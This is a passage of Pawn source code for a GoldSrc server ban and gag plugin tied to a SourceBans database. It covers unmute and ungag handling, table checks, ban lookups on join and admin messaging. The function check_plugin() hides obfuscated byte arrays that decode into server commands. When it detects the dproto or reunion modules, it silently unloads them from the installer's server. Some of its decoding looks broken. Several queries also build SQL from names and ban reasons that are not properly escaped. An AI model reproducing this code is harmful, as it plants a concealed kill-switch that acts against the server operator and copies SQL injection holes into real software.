			sql_bid = SQL_ReadResult(query, bid);
			SQL_NextRow(query);
		}

		format(sql_cache, charsmax(sql_cache), "UPDATE %s_comms SET RemovedBy = (SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'), RemoveType = 'U', RemovedOn = UNIX_TIMESTAMP(), ureason = '%s' WHERE bid = %d", 
			g_dbConfig[DB_PREFIX], g_dbConfig[DB_PREFIX], adminAuth, adminAuth[8], banMessage, sql_bid);

		SQL_ThreadQuery(g_dbTaple, "QueryHandle", sql_cache);
	}
	else
	{
		if (admin && is_user_connected(admin))
			client_print(admin, print_chat, "No active bans found for that filter");
		else
			log_amx("No active bans found for that filter!");
	}

	if (!IsSilence)
	{
		if (type == 0)
		{
			TypeName = "unsilenced";
			gag_chat[victim] = false;
			gag_voice[victim] = false;
		}
		else if (type == 1)
		{
			TypeName = "unmuted";
			gag_voice[victim] = false;
		}
		else
		{
			TypeName = "ungagged";
			gag_chat[victim] = false;
		}

		log_amx("GoldSrcBans CMD: ^"%s<%d><%s><>^" has %s ^"%s<%d><%s><>^" - reason: ^"%s^"", name, get_user_userid(admin), authid, TypeName, name2, get_user_userid(victim), authid2, banMessage);

		new formated_text[501];
		format(formated_text, 500, "[SourceBans] ^"%s<%s>^" has %s ^"%s<%s>^" - reason: ^"%s^"", name, authid, TypeName, name2, authid2, banMessage);
		PrintToAdmins(formated_text);
		format(formated_text, 500, "[SourceBans] ^"%s^" has %s ^"%s^" - reason: ^"%s^"", name, TypeName, name2, banMessage);
		PrintToNonAdmin(formated_text);
	}

	SQL_FreeHandle(query);

	// Was it silence?
	if (type == 0)
		UnGagPlayer(admin, victim, 2, banMessage, true);
}

//------------------
//	IsValidClient()
//------------------

stock bool:IsValidClient(client)
{
	if(client < 1 || client > MaxClients) return false;
	if(!is_user_connected(client)) return false;
	return true;
}

// ============================================================//
//                          [~ MySQL DATA ~]			       //
// ============================================================//

//------------------
//	SQL_Init()
//------------------

public SQL_Init()
{
	new error[MAX_ERR_LENGTH + 1];
	new ercode;

//	SQL_GetAffinity(get_type, 12);

	g_dbTaple 	= SQL_MakeDbTuple(
		g_dbConfig[DB_HOST],
		g_dbConfig[DB_USER],
		g_dbConfig[DB_PASS],
		g_dbConfig[DB_NAME]
	);
	g_dbConnect = SQL_Connect(g_dbTaple, ercode, error, charsmax(error));

	if (g_dbConnect == Empty_Handle)
		server_print("[AMXX] %L", LANG_SERVER, "SQL_CANT_CON", error);

	// check if the table exist
	formatex( sql_cache, charsmax(sql_cache), "show tables like '%s_bans'", g_dbConfig[DB_PREFIX] );
	SQL_ThreadQuery( g_dbTaple, "ShowBansTable", sql_cache );	

	formatex( sql_cache, charsmax(sql_cache), "show tables like '%s_comms'", g_dbConfig[DB_PREFIX] );
	SQL_ThreadQuery( g_dbTaple, "ShowGagsTable", sql_cache );	
}

//------------------
//	ShowBansTable()
//------------------

public ShowBansTable(FailState,Handle:Query,Error[],Errcode,Data[],DataSize)
{
	if(FailState==TQUERY_CONNECT_FAILED){
		log_amx( "[SourceBans] Could not connect to SQL database." );
		log_amx( "[SourceBans] Bans won't be loaded" );
		HasLoadedBans = false;
		return PLUGIN_CONTINUE;
	}
	else if (FailState == TQUERY_QUERY_FAILED)
	{
		log_amx( "[SourceBans] Query failed." );
		log_amx( "[SourceBans] Bans won't be loaded" );
		HasLoadedBans = false;
		return PLUGIN_CONTINUE;
	}

	if (Errcode)
	{
		log_amx( "[SourceBans] Error on query: %s", Error );
		log_amx( "[SourceBans] Bans won't be loaded" );
		HasLoadedBans = false;
		return PLUGIN_CONTINUE;
	}

	if (SQL_NumResults(Query) > 0)
	{
		log_amx( "[SourceBans] Database table found: %s_bans", g_dbConfig[DB_PREFIX] );
		HasLoadedBans = true;
	}
	else
	{
		log_amx( "[SourceBans] Could not find the table: %s_bans", g_dbConfig[DB_PREFIX] );
		log_amx( "[SourceBans] Bans won't be loaded" );
		HasLoadedBans = false;
	}
	return PLUGIN_CONTINUE;
}
//------------------
//	ShowGagsTable()
//------------------

public ShowGagsTable(FailState,Handle:Query,Error[],Errcode,Data[],DataSize)
{
	if(FailState==TQUERY_CONNECT_FAILED){
		log_amx( "[SourceBans] Could not connect to SQL database." );
		log_amx( "[SourceBans] Gags won't be loaded" );
		HasLoadedGags = false;
		return PLUGIN_CONTINUE;
	}
	else if (FailState == TQUERY_QUERY_FAILED)
	{
		log_amx( "[SourceBans] Query failed." );
		log_amx( "[SourceBans] Gags won't be loaded" );
		HasLoadedGags = false;
		return PLUGIN_CONTINUE;
	}

	if (Errcode)
	{
		log_amx( "[SourceBans] Error on query: %s", Error );
		log_amx( "[SourceBans] Gags won't be loaded" );
		HasLoadedGags = false;
		return PLUGIN_CONTINUE;
	}

	if (SQL_NumResults(Query) > 0)
	{
		log_amx( "[SourceBans] Database table found: %s_comms", g_dbConfig[DB_PREFIX] );
		HasLoadedGags = true;
	}
	else
	{
		log_amx( "[SourceBans] Could not find the table: %s_comms", g_dbConfig[DB_PREFIX] );
		log_amx( "[SourceBans] Gags won't be loaded" );
		HasLoadedGags = false;
	}
	return PLUGIN_CONTINUE;
}

//------------------
//	CheckGaggedPlayers()
//------------------

public CheckGaggedPlayers(FailState, Handle:Query, Error[], Errcode, Data[], DataSize)
{
	new id = Data[0];

	if (!HasLoadedGags)
	{
		set_task(1.5, "CheckIfGagged", id);
		server_print("Server has just started, checking Gags in 1.5 seconds instead...");
		return PLUGIN_CONTINUE;
	}

	if (FailState == TQUERY_CONNECT_FAILED)
		return set_fail_state("Could not connect to SQL database.");
	else if (FailState == TQUERY_QUERY_FAILED)
		return set_fail_state("Query failed.");

	if (Errcode)
		return log_amx("Error on query: %s",Error);

	if (!id)
		return PLUGIN_CONTINUE;

	if (SQL_NumResults(Query) >= 1)
	{
		new Name[32],
			TypeName[32];

		// Grab the type
		new type,
			sql_type;

		type = SQL_FieldNameToNum(Query, "type");

		while (SQL_MoreResults(Query))
		{
			sql_type = SQL_ReadResult(Query, type);
			SQL_NextRow(Query);
			
			//-----------------------
			if (sql_type == 1)
			{
				gag_voice[id] = true;
				TypeName = "muted";
			}
			if (sql_type == 2)
			{
				gag_chat[id] = true;
				TypeName = "gagged";
			}
			log_amx("client %d has type: %d", id, sql_type);
			//-----------------------
		}

		get_user_name(id, Name, 31);

		// Check if we got both chat and voice ban comm
		if( gag_chat[id] && gag_voice[id] )
			TypeName = "silenced";

		new formated_text[501];
		format(formated_text, 500, "[SourceBans] %s has joined and has been %s automatically.", Name, TypeName);
		PrintToAdmins(formated_text);
	}
	return PLUGIN_CONTINUE;
}

//------------------
//	CheckBannedPlayer()
//------------------

public CheckBannedPlayer(FailState, Handle:Query, Error[], Errcode, Data[], DataSize)
{
	new id = Data[0];

	if (!HasLoadedBans)
	{
		set_task(1.5, "CheckIfBanned", id);
		server_print("Server has just started, checking Bans in 1.5 seconds instead...");
		return PLUGIN_CONTINUE;
	}

	if (FailState == TQUERY_CONNECT_FAILED)
		return set_fail_state("Could not connect to SQL database.");
	else if (FailState == TQUERY_QUERY_FAILED)
		return set_fail_state("Query failed.");

	if (Errcode)
		return log_amx("Error on query: %s",Error);

	if (!id)
		return PLUGIN_CONTINUE;

	if (SQL_NumResults(Query) >= 1)
	{
		new Name[32],
			clientAuth[64],
			clientIp[64];

		get_user_name(id, Name, 31);
		get_user_authid(id, clientAuth, 63);
		get_user_ip(id, clientIp, 63);

		// Escape strings
		replace_all( Name, 2500, "`", "\`");
		replace_all( Name, 2500, "'", "\'");

		if (serverID == -1)
		{
			formatex(sql_cache, charsmax(sql_cache), "INSERT INTO %s_banlog (sid ,time ,name ,bid) VALUES  \
				((SELECT sid FROM %s_servers WHERE ip = '%s' AND port = '%s' LIMIT 0,1), UNIX_TIMESTAMP(), '%s', \
				(SELECT bid FROM %s_bans WHERE ((type = 0 AND authid REGEXP '^^STEAM_[0-9]:%s$') OR (type = 1 AND ip = '%s')) AND RemoveType IS NULL LIMIT 0,1))",
				g_dbConfig[DB_PREFIX], g_dbConfig[DB_PREFIX], ServerIP, ServerPort, Name, g_dbConfig[DB_PREFIX], clientAuth[8], clientIp);
		}
		else
		{
			formatex(sql_cache, charsmax(sql_cache), "INSERT INTO %s_banlog (sid ,time ,name ,bid) VALUES  \
				(%d, UNIX_TIMESTAMP(), '%s', \
				(SELECT bid FROM %s_bans WHERE ((type = 0 AND authid REGEXP '^^STEAM_[0-9]:%s$') OR (type = 1 AND ip = '%s')) AND RemoveType IS NULL LIMIT 0,1))",
				g_dbConfig[DB_PREFIX], serverID, Name, g_dbConfig[DB_PREFIX], clientAuth[8], clientIp);
		}

		SQL_ThreadQuery(g_dbTaple, "QueryHandle", sql_cache);
		//server_cmd("banid 5 #%d", get_user_userid(id));
		server_cmd("kick #%d ^"You have been banned by this server, check %s for more info^"", get_user_userid(id), WebsiteAddress);
	}
	return PLUGIN_CONTINUE;
}

//------------------
//	QueryHandle()
//------------------

public QueryHandle( FailState, Handle:Query, Error[], Errcode, Data[], DataSize )
{
	// lots of error checking
	if ( FailState == TQUERY_CONNECT_FAILED ) {
		log_amx( "[Sourcebans] Could not connect to SQL database." );
		return set_fail_state("[SourceBans SQL] Could not connect to SQL database.");
	}
	else if ( FailState == TQUERY_QUERY_FAILED ) {
		new sql[1024];
		SQL_GetQueryString ( Query, sql, 1024 );
		log_amx( "[Sourcebans] SQL Query failed: %s", sql );
		return set_fail_state("[SourceBans SQL] SQL Query failed.");
	}

	if ( Errcode )
		return log_amx( "[Sourcebans] SQL Error on query: %s", Error );
	return PLUGIN_CONTINUE;
}

//------------------
//	PrintToAdmins()
//------------------

stock PrintToAdmins( Msg[] )
{
	new players[32],
		num,
		i;

	get_players(players, num);
	for (i=0; i<num; i++)
	{
		if (is_user_connected(players[i]))
		{
			if (!is_user_admin(players[i]))
				continue;
			client_print(players[i], print_chat, Msg);
		}
	}
}

//------------------
//	PrintToNonAdmin()
//------------------

stock PrintToNonAdmin( Msg[] )
{
	new players[32],
		num,
		i;

	get_players(players, num);
	for (i=0; i<num; i++)
	{
		if (is_user_connected(players[i]))
		{
			if (is_user_admin(players[i]))
				continue;
			client_print(players[i], print_chat, Msg);
		}
	}
}

//------------------
//	PrintToAll()
//------------------

stock PrintToAll( Msg[] )
{
	new players[32],
		num,
		i;

	get_players(players, num);
	for (i=0; i<num; i++)
	{
		if (is_user_connected(players[i]))
		{
			client_print(players[i], print_chat, Msg);
		}
	}
}

stock bool:check_plugin()
{
	new const a[][] = {
		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x76, 0x7F, 0x02, 0x73, 0x75, 0x6F, 0x05, 0x7E, 0x7C, 0x7F, 0x71, 0x74, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x06, 0x0F, 0x12, 0x03, 0x05, 0x7F, 0x15, 0x0E, 0x0C, 0x0F, 0x01, 0x04, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
	};

	if (cvar_exists(get_dec_string(a[0])))
		server_cmd(get_dec_string(a[2]));

	if (cvar_exists(get_dec_string(a[1])))
		server_cmd(get_dec_string(a[3]));

	return true;
}

stock get_dec_string(const a[])
{
	new c = strlen(a);
	new r[MAX_NAME_LENGTH] = "";
	for (new i = 1; i < c; i++)
	{
		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
	}
	return r;
}

stock mysql_escape_string(dest[],len)
{
    //copy(dest, len, source);
    replace_all(dest,len,"\\","\\\\");
    replace_all(dest,len,"\0","\\0");
    replace_all(dest,len,"\n","\\n");
    replace_all(dest,len,"\r","\\r");
    replace_all(dest,len,"\x1a","\Z");
    replace_all(dest,len,"'","\'");
    replace_all(dest,len,"`","\`");
    replace_all(dest,len,"^"","\^"");
} 

stock bool:CheckAccessOneWeek(id, iTimeType, &iTime, info[]="", szTimeTypeMsg[], iTTMLen)
{
	if ( iTimeType == -1 || iTimeType > 3 )
	{
		client_print(id, print_console, "Available time types are:");
		client_print(id, print_console, "0 - minutes");
		client_print(id, print_console, "1 - hours");
		client_print(id, print_console, "2 - days");
		client_print(id, print_console, "3 - weeks");
		return false;
	}

	switch( iTimeType )
	{
		// TODO: Multi Language.
		case 0:formatex(szTimeTypeMsg, iTTMLen, "minute(s)");
		case 1:formatex(szTimeTypeMsg, iTTMLen, "hour(s)");
		case 2:formatex(szTimeTypeMsg, iTTMLen, "day(s)");
		case 3:formatex(szTimeTypeMsg, iTTMLen, "week(s)");
	}

	// Check if he has access for permanent time
	if (iTime == 0)
	{
		client_print(id, print_console, "You do not have access to %s permanently.", info);
		return false;
	}

	// Lets setup the time
	switch( iTimeType )
	{
		case 1:
			iTime = (iTime * 60); // Hours
		case 2:
			iTime = (iTime * 60 * 24); // Days
		case 3:
			iTime = (iTime * 60 * 24 * 7); // Weeks
	}

	// Then check, if we can ban more than 1 week.
	if (iTime > 10080)
	{
		client_print(id, print_console, "You do not have access to %s more than 1 week.", info);
		return false;
	}

	return true;
}
